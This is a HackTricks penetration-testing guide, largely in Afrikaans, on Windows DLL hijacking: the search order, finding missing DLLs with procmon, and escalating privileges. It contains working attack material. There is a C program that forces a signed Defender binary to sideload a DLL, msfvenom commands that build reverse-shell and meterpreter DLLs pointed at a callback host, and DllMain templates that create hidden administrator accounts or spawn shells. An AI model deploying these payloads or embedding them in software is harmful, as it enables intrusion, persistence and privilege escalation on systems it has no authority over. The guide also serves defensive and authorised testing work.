# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Basiese Inligting

DLL Hijacking behels die manipulasie van 'n vertroude toepassingsprogramme om 'n kwaadwillige DLL te laai. Hierdie term dek verskeie taktieke soos **DLL Spoofing, Injection, and Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, om persistentie te bereik, en minder gereeld vir privilege escalation. Alhoewel die fokus hier op escalation is, bly die metode van hijacking konstant oor die verskillende doelwitte.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL hijacking, en elkeen se doeltreffendheid hang af van die toepassing se DLL laai-strategie:

1. **DLL Replacement**: Ruil 'n egte DLL vir 'n kwaadwillige een, opsioneel deur DLL Proxying te gebruik om die oorspronklike DLL se funksionaliteit te bewaar.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in 'n soekpad wat voor die legitiméne een kom, en benut die toepassing se soekpatroon.
3. **Phantom DLL Hijacking**: Skep 'n kwaadwillige DLL wat 'n toepassing sal laai omdat dit dink dit is 'n vereiste DLL wat nie bestaan nie.
4. **DLL Redirection**: Wysig soekparameters soos %PATH% of .exe.manifest / .exe.local lêers om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Vervang die legitiméne DLL met 'n kwaadwillige teenvoeter in die WinSxS gids, 'n metode dikwels geassosieer met DLL side-loading.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in 'n gebruikerbeheerde gids saam met 'n gekopieerde toepassing, wat ooreenstem met Binary Proxy Execution tegnieke.

## Vind ontbrekende Dlls

Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te laat loop en die **volgende 2 filters** te **stel**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

en wys net die **File System Activity**:

![](<../../images/image (314).png>)

As jy op soek is na **ontbrekende dlls in die algemeen** laat jy dit hierdie proses vir 'n **paar sekondes** loop.\
As jy op soek is na 'n **ontbrekende dll binne 'n spesifieke uitvoerbare lêer** moet jy 'n ander filter stel soos "Process Name" "contains" "\<exec name>", voer dit uit, en stop die gebeurtenisse wat vasgelê word.

## Exploiteer ontbrekende Dlls

Om privaatheid te eskaleer is die beste kans wat ons het om 'n **dll te skryf wat 'n privilegie-proses sal probeer laai** in een van die **plekke waar dit gaan gesoek word**. Dus sal ons in staat wees om 'n dll te **skryf** in 'n **map** waar die **dll gesoek word voordat** die gids waar die **oorspronklike dll** is (skaars geval), of ons sal in staat wees om te **skryf in 'n map waar die dll gesoek gaan word** en die oorspronklike **dll nie in enige gids bestaan nie**.

### Dll Search Order

**In die** [**Microsoft dokumentasie**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek gelaai word.**

Windows-toepassings soek na DLLs deur 'n stel voorafbepaalde soekpade te volg, in 'n bepaalde volgorde. Die probleem van DLL hijacking ontstaan wanneer 'n kwaadwillige DLL strategies in een van hierdie gidse geplaas word, wat verseker dat dit gelaai word voordat die egte DLL. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paaie gebruik wanneer dit na die DLLs verwys wat dit benodig.

Jy kan die **DLL search order op 32-bit** stelsels hieronder sien:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Dit is die **verstek** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, beweeg die huidige gids na die tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (verstek is geaktiveer).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** aangeroep word, begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.

Laastens, neem kennis dat **'n dll gelaai kan word deur die absolute pad aan te dui in plaas van net die naam**. In daardie geval sal daardie dll **slegs in daardie pad gesoek word** (as die dll enige afhanklikhede het, sal hulle gesoek word soos net gelaai deur naam).

Daar is ander maniere om die soekorde te verander, maar ek gaan dit nie hier verduidelik nie.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

'n Gesofistikeerde manier om deterministies die DLL soekpad van 'n nuut geskepte proses te beïnvloed is om die DllPath veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer jy die proses met ntdll se native APIs skep. Deur 'n aanvaller-beheerde gids hier te verskaf, kan 'n teikenproses wat 'n geïmporteerde DLL per naam oplos (geen absolute pad en nie die veilige laaivlagte gebruik nie) gedwing word om 'n kwaadwillige DLL van daardie gids te laai.

Sleutelidee
- Bou die process parameters met RtlCreateProcessParametersEx en verskaf 'n pasgemaakte DllPath wat na jou beheer-gids wys (bv. die gids waar jou dropper/unpacker leef).
- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binary 'n DLL per naam oplos, sal die loader hierdie verskafte DllPath raadpleeg tydens resolusie, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie saam met die teiken EXE geplaas is nie.

Aantekeninge/beperkings
- Dit beïnvloed die kindproses wat geskep word; dit is anders as SetDllDirectory, wat slegs die huidige proses beïnvloed.
- Die teiken moet 'n DLL invoer of LoadLibrary per naam gebruik (geen absolute pad en nie LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories gebruik nie).
- KnownDLLs en hardgekodeerde absolute paaie kan nie gehijack word nie. Forwarded exports en SxS kan prioriteit verander.

Minimale C-voorbeeld (ntdll, wide strings, vereenvoudigde foutbehandeling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Plaas 'n kwaadwillige xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Wanneer 'n **DLL wat dieselfde naam deel as een wat reeds in geheue gelaai is** teëgekom word, omseil die stelsel die gewone soektog. In plaas daarvan voer dit 'n kontrole vir redirection en 'n manifest uit voordat dit standaard terugval op die DLL wat reeds in geheue is. **In hierdie scenario voer die stelsel nie 'n soektog vir die DLL uit nie**.
- In gevalle waar die DLL as 'n **known DLL** vir die huidige Windows-weergawe herken word, sal die stelsel sy weergawe van die known DLL gebruik, saam met enige van sy afhanklike DLLs, **sonder die soekproses**. Die register sleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat 'n lys van hierdie known DLLs.
- As 'n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLLs uitgevoer asof hulle slegs deur hul **module names** aangedui is, ongeag of die aanvanklike DLL via 'n volle pad geïdentifiseer is.

### Escalating Privileges

**Vereistes**:

- Identifiseer 'n proses wat werk of gaan werk onder **verskillende voorregte** (horizontal or lateral movement), wat **nie 'n DLL het nie**.
- Verseker dat **write access** beskikbaar is vir enige **directory** waarin die **DLL** gaan wees wat **gesoek word**. Hierdie ligging kan die gids van die uitvoerbare lêer wees of 'n gids binne die system path.

Ja, die vereistes is moeilik om te vind want **per verstek is dit redelik vreemd om 'n geprivilegieerde uitvoerbare lêer te vind wat 'n dll ontbreek** en dit is selfs **meer vreemd om write permissions op 'n system path folder te hê** (jy het dit nie standaard nie). Maar, in verkeerd gekonfigureerde omgewings is dit moontlik.\
In die geval dat jy gelukkig is en aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) project nagaan. Selfs al is die **main goal of the project is bypass UAC**, mag jy daar 'n **PoC** van 'n Dll hijaking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die gids waar jy write permissions het te verander).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die toestemmings van alle gidse binne PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **abuse Dll Hijacking to escalate privileges** met toestemming om in 'n **System Path folder** te skryf, sien:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Outomatiese hulpmiddels

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal kyk of jy skryftoestemmings het op enige gids binne die system PATH.\  
Ander interessante outomatiese gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Voorbeeld

As jy 'n benutbare scenario vind, is een van die belangrikste dinge om dit suksesvol te benut om **create a dll that exports at least all the functions the executable will import from it**. Let wel dat Dll Hijacking handig kan wees om [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) of van[ **High Integrity to SYSTEM**](#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **how to create a valid dll** in hierdie dll hijacking-studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\  
Verder, in die **next sectio**n kan jy 'n paar **basic dll codes** vind wat nuttig kan wees as **templates** of om 'n **dll with non required functions exported** te skep.

## **Skep en kompileer Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat in staat is om jou kwaadwillige kode uit te voer wanneer dit gelaai word, maar ook om te funksioneer soos verwag deur alle oproepe na die werklike biblioteek deur te stuur.

Met die hulpmiddel [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik 'n uitvoerbare lêer aandui en die biblioteek kies wat jy wil proxify en 'n proxified dll genereer, of net die Dll aandui en 'n proxified dll genereer.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 ek het nie 'n x64-weergawe gesien nie):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

Let wel dat in verskeie gevalle die Dll wat jy kompileer verskeie funksies moet **export several functions** wat deur die slagofferproses gelaai gaan word. As hierdie funksies nie bestaan nie, sal die **binary won't be able to load** hulle en sal die **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Verwysings

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
